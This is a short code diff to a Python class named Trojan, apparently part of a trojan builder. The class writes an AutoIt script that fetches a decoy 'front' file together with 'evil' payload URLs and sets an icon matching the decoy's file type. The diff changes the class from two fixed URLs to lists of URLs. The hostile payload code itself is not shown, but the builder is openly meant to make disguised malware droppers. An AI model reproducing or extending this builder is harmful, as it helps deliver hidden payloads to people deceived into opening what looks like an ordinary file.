@@ -29,16 +29,15 @@ EndFunc   ;==>_GetURLImage
 
 class Trojan:
 
-	def __init__(self, url1, url2, icon, out_file):
-		self.url1 = url1
-		self.url2 = url2
-		file_type = url1.split(".")[-1].replace("#", "")
+	def __init__(self, front_urls, evil_urls, icon, out_file):
+		self._target_urls = front_urls + evil_urls
+		file_type = front_urls[0].split(".")[-1].replace("#", "")
 		self.icon = self.set_icon(icon, file_type)
 		self.out_file = out_file
 		
 					
 	def create(self):
-		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
+		urls = 'Local $urls = "' +  ",".join(self._target_urls) + '"\n'
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
 			trojan_file.write(urls + trojan_code)
 
